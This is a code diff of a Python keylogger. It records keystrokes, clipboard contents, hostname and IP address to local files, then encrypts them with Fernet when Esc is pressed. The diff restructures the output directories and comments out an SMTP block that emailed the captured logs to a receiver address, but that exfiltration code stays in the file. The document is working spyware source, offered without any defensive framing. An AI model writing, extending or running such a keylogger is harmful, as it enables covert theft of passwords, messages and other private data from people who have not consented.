@@ -26,16 +26,41 @@ from requests import get
 
 from multiprocessing import Process, freeze_support
 
+#base directory
+
+base_dir = os.path.join(os.getcwd(), "Project", "Plain_Text")
+os.makedirs(base_dir, exist_ok=True)
+
+#Encrypted files directory
+
+enc_dir = os.path.join(os.getcwd(), "Project", "Encrypted")
+os.makedirs(enc_dir, exist_ok=True)
+
+#Plain textfiles
+
 key_information = "key_log.txt"
 system_information = "system_info.txt"
 clipboard_information = "clipboard.txt"
 
+#Encrypted Textfiles
 
 key_information_e = "e_key_information.txt"
 system_information_e = "e_system_info.txt"
 clipboard_information_e = "e_clipboard.txt"
 
-file_merge = os.path.join(os.getcwd(), "Project")
+#Plain textfiles Path
+
+key_path = os.path.join(base_dir, key_information)
+system_info_path = os.path.join(base_dir, system_information)
+clipboard_path = os.path.join(base_dir, clipboard_information)
+
+#Encrypted textfiles path (e stands for encrypted)
+
+key_e_path = os.path.join(enc_dir, key_information_e) 
+system_info_e_path = os.path.join(enc_dir, system_information_e)
+clipboard_e_path = os.path.join(enc_dir, clipboard_information_e)
+
+#Encryption Key
 
 key = get_or_create_key()
 fernet = Fernet(key)
@@ -45,7 +70,7 @@ keys = []
 
 #Email
 
-email_address = input("Enter senders Email Address: ")
+'''email_address = input("Enter senders Email Address: ")
 password = input("Enter App specific Password")
 toaddr = input("Enter the reciver's Address: ")
 attachment = file_merge + key_information
@@ -95,12 +120,12 @@ def send_email(filename, attachment, toaddr):
 try:
     send_email(key_information, attachment, toaddr)
 except Exception as e:
-    print("Email failed:", e)
+    print("Email failed:", e)'''
 
 #PC Information
 
 def pc_information():
-    with open(file_merge + system_information, "a") as f:
+    with open(system_info_path, "a") as f:
         hostname = socket.gethostname()
         ipaddr = socket.gethostbyname(hostname)
         try:
@@ -116,12 +141,16 @@ def pc_information():
         f.write("Hostname: " + hostname + '\n')
         f.write("Private IP Address: " + ipaddr + '\n')
 
+
+
 pc_information()
+
+
 
 #Clipboard 
 
 def copy_clipboard():
-    with open(file_merge + clipboard_information, "a") as f:
+    with open(clipboard_path, "a") as f:
         try:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
@@ -132,9 +161,12 @@ def copy_clipboard():
         except:
             f.write("Clipboard could not be copied")
 
+
+
 copy_clipboard()
 
 # Key Logger logic
+
 def on_press(key):
     global keys, count 
 
@@ -148,7 +180,7 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    with open(file_merge + key_information, "a") as f:
+    with open(key_path, "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
@@ -158,32 +190,31 @@ def write_file(keys):
             elif k.find("Key") == -1:
                f.write(k)
 
+#Esc key stops the key logger and starts the encryption of collected data
 
-def on_release(key):
-    if key == Key.esc:
+def on_release(released_key):
+    if released_key == Key.esc:
         #Encryption
 
-        count = 0
+        files_to_encrypt = [(key_path,key_e_path), (system_info_path, system_info_e_path), (clipboard_path, clipboard_e_path)]
 
-        file_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + key_information]
-        encrypted_files_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + key_information_e]
+        for src, dst in files_to_encrypt:
+            if not os.path.exists(src):
+                continue
 
-        for encrypting_files in file_to_encrypt:
-
-            with open(file_to_encrypt[count], 'rb') as f:
+            with open(src, "rb") as f:
                 data = f.read()
 
-            fernet = Fernet(key)
             encrypted = fernet.encrypt(data)
 
-            with open(encrypted_files_names[count], 'wb') as f:
+            with open(dst, "wb") as f:
                 f.write(encrypted)
 
-            send_email(encrypted_files_names[count], encrypted_files_names[count], toaddr)
-            count += 1
-
-        time.sleep(120)
-        return False
+        listener.stop()
+        os._exit(0)
+        
+#listener
+        
 
 with Listener(on_press=on_press, on_release=on_release) as listener: 
     listener.join()
